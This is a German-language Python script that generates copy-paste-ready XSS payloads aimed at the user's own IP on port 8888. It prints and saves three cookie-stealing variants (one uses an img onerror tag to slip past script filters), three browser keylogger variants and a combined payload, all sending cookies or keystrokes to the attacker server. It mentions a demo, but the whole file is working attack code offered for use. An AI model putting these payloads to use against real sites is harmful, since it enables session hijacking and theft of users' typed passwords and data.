#!/usr/bin/env python3
"""
PAYLOAD GENERATOR
=================
Generiert automatisch XSS-Payloads mit deiner aktuellen IP-Adresse

USAGE:
    python3 payload_generator.py
"""

import socket
import sys

def get_local_ip():
    """Ermittelt die lokale IP-Adresse"""
    try:
        # Erstelle Socket-Verbindung (ohne wirklich zu verbinden)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def main():
    # IP-Adresse ermitteln
    ip = get_local_ip()

    print("â" + "="*70 + "â")
    print("â" + " "*20 + "PAYLOAD GENERATOR" + " "*34 + "â")
    print("â" + "="*70 + "â\n")

    print(f"ð¡ Deine IP-Adresse: {ip}")
    print(f"ð¯ Attacker-Server Port: 8888\n")
    print("="*72)

    # Cookie-Stealer Payloads
    print("\nðª COOKIE STEALER PAYLOADS:\n")
    print("-" * 72)

    print("VARIANTE 1 - Kompakt (empfohlen):")
    cookie_v1 = f"<script>fetch('http://{ip}:8888/steal_cookie?c='+document.cookie)</script>"
    print(f"{cookie_v1}\n")

    print("VARIANTE 2 - Image Tag (falls <script> gefiltert wird):")
    cookie_v2 = f"<img src=x onerror=\"fetch('http://{ip}:8888/steal_cookie?c='+document.cookie)\">"
    print(f"{cookie_v2}\n")

    print("VARIANTE 3 - XMLHttpRequest:")
    cookie_v3 = f"""<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://{ip}:8888/steal_cookie', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('c=' + encodeURIComponent(document.cookie));
</script>"""
    print(f"{cookie_v3}\n")

    print("="*72)

    # Keylogger Payloads
    print("\nâ¨ï¸  KEYLOGGER PAYLOADS:\n")
    print("-" * 72)

    print("VARIANTE 1 - Zeit-basiert (empfohlen - sendet alle 3 Sekunden):")
    keylog_v1 = f"""<script>let buffer='';document.addEventListener('keypress',function(e){{buffer+=e.key;}});setInterval(function(){{if(buffer.length>0){{fetch('http://{ip}:8888/log_keys',{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded'}},body:'keys='+encodeURIComponent(buffer)}});buffer='';}}}},3000);</script>"""
    print(f"{keylog_v1}\n")

    print("VARIANTE 2 - Sofort (sendet jeden Tastendruck einzeln):")
    keylog_v2 = f"""<script>
document.addEventListener('keypress', function(e) {{
    fetch('http://{ip}:8888/log_keys', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
        body: 'keys=' + encodeURIComponent(e.key)
    }});
}});
</script>"""
    print(f"{keylog_v2}\n")

    print("VARIANTE 3 - Batch (nach 10 Zeichen):")
    keylog_v3 = f"""<script>
let keys = '';
document.addEventListener('keypress', function(e) {{
    keys += e.key;
    if (keys.length > 10) {{
        fetch('http://{ip}:8888/log_keys', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
            body: 'keys=' + encodeURIComponent(keys)
        }});
        keys = '';
    }}
}});
</script>"""
    print(f"{keylog_v3}\n")

    print("="*72)

    # Kombiniert
    print("\nð¥ KOMBINIERTER ANGRIFF (Cookie + Keylogger):\n")
    print("-" * 72)
    combined = f"""<script>
// Cookie stehlen
fetch('http://{ip}:8888/steal_cookie?c='+document.cookie);

// Keylogger starten
let buffer='';
document.addEventListener('keypress',function(e){{buffer+=e.key;}});
setInterval(function(){{
    if(buffer.length>0){{
        fetch('http://{ip}:8888/log_keys',{{
            method:'POST',
            headers:{{'Content-Type':'application/x-www-form-urlencoded'}},
            body:'keys='+encodeURIComponent(buffer)
        }});
        buffer='';
    }}
}},3000);
</script>"""
    print(f"{combined}\n")

    print("="*72)

    # In Datei speichern
    filename = "GENERATED_PAYLOADS.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write("="*72 + "\n")
        f.write("XSS PAYLOADS - AUTO-GENERATED\n")
        f.write("="*72 + "\n\n")
        f.write(f"Deine IP: {ip}\n")
        f.write(f"Server Port: 8888\n")
        f.write(f"Generiert: {__import__('datetime').datetime.now()}\n\n")

        f.write("="*72 + "\n")
        f.write("COOKIE STEALER - VARIANTE 1 (EMPFOHLEN)\n")
        f.write("="*72 + "\n")
        f.write(cookie_v1 + "\n\n")

        f.write("="*72 + "\n")
        f.write("COOKIE STEALER - VARIANTE 2 (IMAGE TAG)\n")
        f.write("="*72 + "\n")
        f.write(cookie_v2 + "\n\n")

        f.write("="*72 + "\n")
        f.write("KEYLOGGER - VARIANTE 1 (EMPFOHLEN)\n")
        f.write("="*72 + "\n")
        f.write(keylog_v1 + "\n\n")

        f.write("="*72 + "\n")
        f.write("KOMBINIERT (COOKIE + KEYLOGGER)\n")
        f.write("="*72 + "\n")
        f.write(combined + "\n\n")

    print(f"\nâ Payloads wurden auch gespeichert in: {filename}")
    print("\nð COPY-PASTE BEREIT!\n")

    # Quick-Copy Empfehlung
    print("ð¯ EMPFEHLUNG FÃR DEMO:")
    print("-" * 72)
    print("1. Cookie-Diebstahl Demo:")
    print(f"   {cookie_v1}\n")
    print("2. Keylogger Demo:")
    print(f"   {keylog_v1}\n")
    print("-" * 72)

if __name__ == "__main__":
    main()
